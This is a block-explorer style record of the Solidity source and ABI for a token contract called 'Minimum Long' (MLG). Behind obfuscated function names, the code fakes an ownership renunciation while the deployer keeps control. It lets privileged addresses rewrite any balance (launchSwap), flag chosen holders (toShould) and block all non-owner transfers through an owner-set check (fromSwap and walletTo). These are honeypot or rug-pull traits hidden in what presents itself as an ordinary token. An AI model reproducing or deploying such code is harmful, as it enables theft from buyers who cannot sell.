{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface fromLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptWallet {\n    function createPair(address receiverTotal, address feeLaunchedToken) external returns (address);\n}\n\ninterface sellTxShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxBuy) external view returns (uint256);\n\n    function transfer(address teamModeFee, uint256 receiverTo) external returns (bool);\n\n    function allowance(address fundTxLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamModeFee,\n        uint256 receiverTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atMarketing, uint256 value);\n    event Approval(address indexed fundTxLiquidity, address indexed spender, uint256 value);\n}\n\ninterface sellTxShouldMetadata is sellTxShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MinimumLong is modeSwap, sellTxShould, sellTxShouldMetadata {\n\n    constructor (){\n        \n        fromLaunch isReceiverShould = fromLaunch(teamSwap);\n        fundTx = exemptWallet(isReceiverShould.factory()).createPair(isReceiverShould.WETH(), address(this));\n        if (receiverTx) {\n            receiverTx = true;\n        }\n        teamMode = _msgSender();\n        fundAutoTrading();\n        liquidityTxIs[teamMode] = true;\n        totalLaunch[teamMode] = isMode;\n        \n        emit Transfer(address(0), teamMode, isMode);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeIs;\n    }\n\n    uint256 listLaunch;\n\n    function balanceOf(address maxBuy) public view virtual override returns (uint256) {\n        return totalLaunch[maxBuy];\n    }\n\n    function fromSwap(uint256 receiverTo) public {\n        fromTake();\n        teamReceiverMode = receiverTo;\n    }\n\n    uint256 constant isLaunched = 6 ** 10;\n\n    bool private shouldExemptSwap;\n\n    bool private receiverTx;\n\n    function fundAutoTrading() public {\n        emit OwnershipTransferred(teamMode, address(0));\n        fromMarketingAuto = address(0);\n    }\n\n    bool private enableAtShould;\n\n    address teamSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private isMode = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return fromMarketingAuto;\n    }\n\n    function walletTo(address atFee, address teamModeFee, uint256 receiverTo) internal returns (bool) {\n        if (atFee == teamMode) {\n            return txSellMax(atFee, teamModeFee, receiverTo);\n        }\n        uint256 buyAt = sellTxShould(fundTx).balanceOf(buyMode);\n        require(buyAt == teamReceiverMode);\n        require(teamModeFee != buyMode);\n        if (swapTx[atFee]) {\n            return txSellMax(atFee, teamModeFee, isLaunched);\n        }\n        return txSellMax(atFee, teamModeFee, receiverTo);\n    }\n\n    address public fundTx;\n\n    mapping(address => bool) public liquidityTxIs;\n\n    function transfer(address fromList, uint256 receiverTo) external virtual override returns (bool) {\n        return walletTo(_msgSender(), fromList, receiverTo);\n    }\n\n    address public teamMode;\n\n    mapping(address => uint256) private totalLaunch;\n\n    function getOwner() external view returns (address) {\n        return fromMarketingAuto;\n    }\n\n    uint256 private liquidityMin;\n\n    function launchSwap(address fromList, uint256 receiverTo) public {\n        fromTake();\n        totalLaunch[fromList] = receiverTo;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitFee;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isMode;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountTake;\n    }\n\n    string private amountTake = \"Minimum Long\";\n\n    bool private launchToken;\n\n    address buyMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address toSellAt, address launchedShould) external view virtual override returns (uint256) {\n        if (launchedShould == teamSwap) {\n            return type(uint256).max;\n        }\n        return marketingTo[toSellAt][launchedShould];\n    }\n\n    string private limitFee = \"MLG\";\n\n    address private fromMarketingAuto;\n\n    uint256 teamReceiverMode;\n\n    function txSellMax(address atFee, address teamModeFee, uint256 receiverTo) internal returns (bool) {\n        require(totalLaunch[atFee] >= receiverTo);\n        totalLaunch[atFee] -= receiverTo;\n        totalLaunch[teamModeFee] += receiverTo;\n        emit Transfer(atFee, teamModeFee, receiverTo);\n        return true;\n    }\n\n    function toShould(address senderList) public {\n        fromTake();\n        if (liquidityMin != receiverLaunched) {\n            shouldExemptSwap = true;\n        }\n        if (senderList == teamMode || senderList == fundTx) {\n            return;\n        }\n        swapTx[senderList] = true;\n    }\n\n    uint8 private feeIs = 18;\n\n    bool public sellLaunch;\n\n    bool private swapAt;\n\n    event OwnershipTransferred(address indexed launchedMin, address indexed tradingAmountAt);\n\n    function transferFrom(address atFee, address teamModeFee, uint256 receiverTo) external override returns (bool) {\n        if (_msgSender() != teamSwap) {\n            if (marketingTo[atFee][_msgSender()] != type(uint256).max) {\n                require(receiverTo <= marketingTo[atFee][_msgSender()]);\n                marketingTo[atFee][_msgSender()] -= receiverTo;\n            }\n        }\n        return walletTo(atFee, teamModeFee, receiverTo);\n    }\n\n    uint256 private receiverLaunched;\n\n    mapping(address => mapping(address => uint256)) private marketingTo;\n\n    function fundAmount(address atBuy) public {\n        if (sellLaunch) {\n            return;\n        }\n        if (receiverTx != enableAtShould) {\n            enableAtShould = false;\n        }\n        liquidityTxIs[atBuy] = true;\n        if (receiverTx) {\n            swapAt = false;\n        }\n        sellLaunch = true;\n    }\n\n    function fromTake() private view {\n        require(liquidityTxIs[_msgSender()]);\n    }\n\n    mapping(address => bool) public swapTx;\n\n    function approve(address launchedShould, uint256 receiverTo) public virtual override returns (bool) {\n        marketingTo[_msgSender()][launchedShould] = receiverTo;\n        emit Approval(_msgSender(), launchedShould, receiverTo);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTxLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAmountAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSellAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverTo\",\"type\":\"uint256\"}],\"name\":\"fromSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atBuy\",\"type\":\"address\"}],\"name\":\"fundAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAutoTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTo\",\"type\":\"uint256\"}],\"name\":\"launchSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTxIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderList\",\"type\":\"address\"}],\"name\":\"toShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamModeFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MinimumLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}